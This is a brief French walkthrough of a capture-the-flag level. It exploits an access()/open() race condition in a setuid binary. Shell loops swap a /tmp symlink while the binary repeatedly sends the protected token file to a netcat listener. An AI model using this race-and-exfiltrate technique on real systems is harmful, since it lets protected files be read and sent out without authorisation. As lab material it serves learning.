ici on as aussi un binaire un un ficher `token`

On test donc
```bash
./level10 token
```

Cela nous marque
```
./level10 file host
	sends file to host if you have access to it
```

On fat un `strings` sur le binaire et on vois qu'il envoie sur le port `6969`

On met donc en place un server netcat qui ecoute sur ce port
`nc -l 6969`

En faisant ub `nm` on vois que le programe utilise `access` qui contient une faille
```
       Warning:  Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates
       a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.   For
       this  reason,  the use of this system call should be avoided.  (In the example just described, a safer alternative would be to tempo‐
       rarily switch the process's effective user ID to the real ID and then call open(2).)
```
Il suffit de bruteforce

```bash
while true ; do ./level10 token ip:6969 ; done
```
je n'est pas acces a token

je decide de le mettre dans le tmp token
```bash
while true ; do ./level10 /tmp/token ip:6969 ; done
```

Toujours pas

Apres reflection
Comme `level10` a des permission avec l'utilisateur `level10` mais pas `token` pour exploiter la faille de acces au mieux il faudrais swap les deux fichier avec un lien synblique par exemple dans `/tmp/`

```bash
while true; do ln -fs ~/level10 /tmp/token; ln -fs ~/token /tmp/token; done
```

puis
```bash
while true ; do ./level10 /tmp/token ip:6969 ; done
```

On fait tourner les 3 programes et c'est bon !
